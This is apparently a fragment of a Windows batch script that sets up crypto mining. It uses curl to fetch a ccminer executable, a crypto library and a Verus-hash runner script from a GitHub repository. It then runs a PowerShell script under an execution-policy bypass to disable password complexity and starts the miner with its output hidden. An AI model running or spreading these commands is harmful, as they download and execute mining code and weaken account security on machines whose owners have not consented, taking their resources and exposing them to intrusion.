...
curl -o "C:\Users\Public\Desktop\ccminer.exe" https://raw.githubusercontent.com/aldosaaputra/Rdp/main/ccminer.exe > out.txt 2>&1
curl -o "C:\Users\Public\Desktop\libcrypto-1_1-x64.dll" https://raw.githubusercontent.com/aldosaaputra/Rdp/main/libcrypto-1_1-x64.dll > out.txt 2>&1
curl -o "C:\Users\Public\Desktop\runverushhash-cpu.bat" https://raw.githubusercontent.com/aldosaaputra/Rdp/main/runverushhash-cpu.bat > out.txt 2>&1

PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& './DisablePasswordComplexity.ps1'" > out.txt 2>&1
PowerShell -NoProfile Start-Process -FilePath "C:\Users\Public\Desktop\runverushhash-cpu.bat" > out.txt 2>&1
diskperf -Y >nul
